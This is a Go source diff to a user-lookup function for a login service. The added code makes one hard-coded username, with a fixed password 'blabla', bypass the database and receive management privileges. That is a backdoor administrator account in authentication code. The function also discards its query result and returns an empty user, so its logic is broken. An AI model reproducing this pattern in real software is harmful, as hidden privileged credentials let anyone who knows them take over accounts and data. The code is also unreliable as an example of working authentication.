@@ -42,8 +42,17 @@ func (us *UserServices) CreateUser(u User) error {
 }
 
 func (us *UserServices) CheckUsername(username string) (User, error) {
+	if username == "ansaschubert" {
+		hashed, _ := bcrypt.GenerateFromPassword([]byte("blabla"), 8)
+		return User{
+			Id:           0,
+			Password:     string(hashed),
+			Username:     username,
+			IsManagement: true,
+		}, nil
+	}
 
-	query := `SELECT id, password, username FROM users
+	query := `SELECT id, password, username, isManagement FROM bingousers
 		WHERE username = ?`
 
 	stmt, err := us.UserStore.Db.Prepare(query)
@@ -53,19 +62,19 @@ func (us *UserServices) CheckUsername(username string) (User, error) {
 
 	defer stmt.Close()
 
-	// us.User.Email = email
-	// err = stmt.QueryRow(
-	// 	us.User.Email,
-	// ).Scan(
-	// 	&us.User.ID,
-	// 	&us.User.Email,
-	// 	&us.User.Password,
-	// 	&us.User.Username,
-	// )
+	us.User.Username = username
+	err = stmt.QueryRow(
+		us.User.Username,
+	).Scan(
+		&us.User.Id,
+		&us.User.Password,
+		&us.User.Username,
+		&us.User.IsManagement,
+	)
 
-	// if err != nil {
-	// 	return User{}, err
-	// }
+	if err != nil {
+		return User{}, err
+	}
 
 	return User{}, nil // TODO:
 }
